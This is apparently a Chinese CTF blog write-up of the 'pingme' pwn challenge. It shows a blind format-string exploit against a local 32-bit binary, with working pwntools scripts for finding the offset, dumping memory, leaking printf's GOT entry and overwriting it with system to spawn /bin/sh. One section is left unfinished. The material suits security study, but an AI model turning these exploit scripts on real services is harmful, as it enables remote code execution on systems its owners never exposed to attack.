---
title: pwn_pingme
tags: [pwn]
index_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png
banner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705165738806.png
date: 2020-3-31
---



## 前言

本文看不懂可以移步firmianay大佬看详细说明，我记录一些自己的方法。

PLT表和GOT表的关系：https://www.jianshu.com/p/0ac63c3744dd

## 演示环境及工具

操作系统**linux**

```shell
cray@cray:~$ uname -a 
Linux cray 5.3.0-3-amd64 #1 SMP deepin 5.3.15-6apricot (2020-04-13) x86_64 GNU/Linux
cray@cray:~/Documents/Demos$ ldd pingme 
	linux-gate.so.1 (0xf7edc000)
	libc.so.6 => /lib32/libc.so.6 (0xf7cdc000)
	/lib/ld-linux.so.2 (0xf7edd000)

cray@cray:~/Documents/Demos$ ls -la /lib32/|grep "libc.so.6"
lrwxrwxrwx  1 root root      12 3月   3 17:36 libc.so.6 -> libc-2.28.so
cray@cray:~/Documents/Demos$ file /lib32/libc-2.28.so 
/lib32/libc-2.28.so: ELF 32-bit LSB pie executable, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5327eb7657b083923efe41de73fa7755045362d9, for GNU/Linux 3.2.0, stripped
```





调试工具**radare2**

```shell
cray@cray:~$ r2 -v
radare2 4.5.0-git 0 @ linux-x86-64 git.4.5.0-git
commit: HEAD build: 2020-05-14__12:01:18
```





样本下载



### 整体思路

由于没有给源文件，有格式化漏洞，所以思路找到利用偏移，dump源程序，先找到PLT表中的printf位置，再拿到got表中已经加载的实际printf在导入libc中的地址。可以在libc-database找到对应的偏移，最后使用%n的特性，重写got表的地址为libc_system的地址。

### 漏洞复现



我们要自己构造环境，拿到pingme后，网上有很多用socat去重新加载的，但是效率很低 OTZ，这里也给一个 firmianay大佬的方案

```bash
#!/bin/sh
while true; do
        num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
        if [ $num -lt 5 ]; then
                socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &
        fi
done
```

我尝试使用ncat去加载，速度相当快

```shell
ncat -vc ./pingme -lk 10001
```

### 漏洞利用

#### 格式化漏洞

参考https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.1_format_string.md

#### 找到利用点

利用点是 printf格式中`%5$s`的含义是：打印printf的第五个参数所指向的地址

32位程序在传参时将参数放在栈中，经过尝试可以在第7个位置找到保存在栈中的输入数据，如果将他看作地址，就可以任意地址读取.

这里使用pwntools中的exec_fmt来找利用点，原理都是一样的

```python
from pwn import *
p = remote('127.0.0.1', '10001')
def exec_fmt(payload):
    log.info(payload)
    p.sendline(payload)
    info = p.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset
```

输出如下

```javascript
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] aaaabaaacaaadaaaeaaaSTART%1$pEND
[*] aaaabaaacaaadaaaeaaaSTART%2$pEND
[*] aaaabaaacaaadaaaeaaaSTART%3$pEND
[*] aaaabaaacaaadaaaeaaaSTART%4$pEND
[*] aaaabaaacaaadaaaeaaaSTART%5$pEND
[*] aaaabaaacaaadaaaeaaaSTART%6$pEND
[*] aaaabaaacaaadaaaeaaaSTART%7$pEND
[*] Found format string offset: 7
[*] Closed connection to 127.0.0.1 port 10001
```



#### dump源程序

虽然我们这里拿到了源程序，但是比赛中是没提供源程序的，所以要自己用前面的漏洞dump出来

通过前面的漏洞，猜测程序未打开PIE，加载地址未0x8048000

使用`"%9$s.AAA" + p32(start_addr)`格式化是因为printf在打印`\x00`的时候会认为是截断符号，就不会打印任何东西，所以这里将第二个参数设置未`.AAA`来表示这次printf输出了多少数据，如果前面为空，那么就是截断符号，要手动修改.

dump脚本如下

```python
from pwn import *
def dump_memory(start_addr, end_addr):
    result = ""
    while start_addr < end_addr:
        p = remote('127.0.0.1', '10001')
        p.recvline()
        #print result.encode('hex')
        payload = "%9$s.AAA" + p32(start_addr)
        p.sendline(payload)
        data = p.recvuntil(".AAA")[:-4]
        if data == "":
            data = "\x00"
        log.info("leaking: 0x%x --> %s" % (start_addr, data.encode('hex')))
        result += data
        start_addr += len(data)
        p.close()
    return result
start_addr = 0x8048000
end_addr   = 0x8049000
code_bin = dump_memory(start_addr, end_addr)
with open("code.bin", "wb") as f:
    f.write(code_bin)
    f.close()
```

#### 获取printf_got

拿到部分重要的源代码后，就可以在rabin2中来识别符号了，imp.printf 虚拟地址为 0x08048400

```shell
[0x08048490]> is
[Symbols]

nth paddr       vaddr      bind   type   size lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――
11   ---------- 0x080499a4 GLOBAL OBJ    4        stdout
12   0x0000071c 0x0804871c GLOBAL OBJ    4        _IO_stdin_used
13   ---------- 0x080499a0 GLOBAL OBJ    4        stdin
1    0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.setbuf
2    0x00000400 0x08048400 GLOBAL FUNC   16       imp.printf
3    0x00000410 0x08048410 GLOBAL FUNC   16       imp.fgets
4    0x00000420 0x08048420 GLOBAL FUNC   16       imp.alarm
6    ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__
7    0x00000440 0x08048440 GLOBAL FUNC   16       imp.strchr
8    0x00000450 0x08048450 GLOBAL FUNC   16       imp.strlen
9    0x00000460 0x08048460 GLOBAL FUNC   16       imp.__libc_start_main
10   0x00000470 0x08048470 GLOBAL FUNC   16       imp.putchar
```

然后拿到got表中printf的地址  0x8049974

```shell
[0x08048490]> pd 3 @ 0x8048400
        ╎   ; CALL XREF from main @ 0x8048664
┌ 6: int sym.imp.printf (const char *format);
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└       ╎   0x08048400      ff2574990408   jmp dword [reloc.printf]    ; 0x8049974
        ╎   0x08048406      6808000030     push panel.addr             ; 0x30000008
        └─< 0x0804840b      e9d0ffffff     jmp section..plt
```

#### 获取libc_printf找到对应libc

这里的got表指向的就是libc中的printf地址

可以利用这个printf的地址，到libc库里去匹配，找到对应的libc，再拿到system的地址

```pyhton
from pwn import *
def get_libc_printf():
    addr = 0x8049974
    p = remote('127.0.0.1', '10001')
    p.recvline()
    payload = "%9$s.AAA" + p32(addr)
    p.sendline(payload)
    data = p.recvuntil(".AAA")[:4].encode('hex')
    data = data[6:8]+data[4:6]+data[2:4]+data[0:2]
    log.info("leaking: 0x%x --> 0x%s" % (addr, data))
    p.close()
get_libc_printf()
```

我这里输入是860结尾，去https://libc.blukat.me/中搜索

![image-20200521225248944](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200521225248944.png)

我这里由于libc版本比较新，网站没收录，所以自己导入搞一下

用到开源代码https://github.com/niklasb/libc-database

先加载一下libc

```shell
cray@cray:~/SOFT/libc-database$ ./add /lib32/libc-2.28.so 
Adding local libc /lib32/libc-2.28.so (id local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98  /lib32/libc-2.28.so)
  -> Writing libc to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.so
  -> Writing symbols to db/local-8c74cfda272116c51d2de1e1bd19d1f9994d4d98.symbols
  -> Writing version info
```

...（未完待续



拿到偏移后



#### 利用%n特性重写printf_got

脚本

```python
payload = fmtstr_payload(7, {printf_got: system_addr})
p = remote('127.0.0.1', '10001')
p.recvline()
p.sendline(payload)
p.recv()
p.sendline('/bin/sh')
p.interactive()
```



最终我的exp：

```python
from pwn import *
def eeexp():
    printf_got = 0x8049974
    system_offset = 0x0003e9e0
    printf_offset = 0x00052860

    p = remote('127.0.0.1', '10001')
    p.recvline()
    payload = "%9$s.AAA" + p32(printf_got)
    p.sendline(payload)
    data = p.recvuntil(".AAA")[:4].encode('hex')
    data2 = data[6:8]+data[4:6]+data[2:4]+data[0:2]
    printf_so = eval("0x{}".format(data2))
    log.info("printf_so -> 0x%x" % printf_so)
    system_so = printf_so + (system_offset-printf_offset) 
    log.info("system_got -> 0x%x" % system_so)

    payload = fmtstr_payload(7,{printf_got:system_so})
    p.sendline(payload)

    p.recv()
    p.sendline('/bin/sh')
    p.interactive()
if __name__ == "__main__":
    eeexp()

```



### 参考

https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md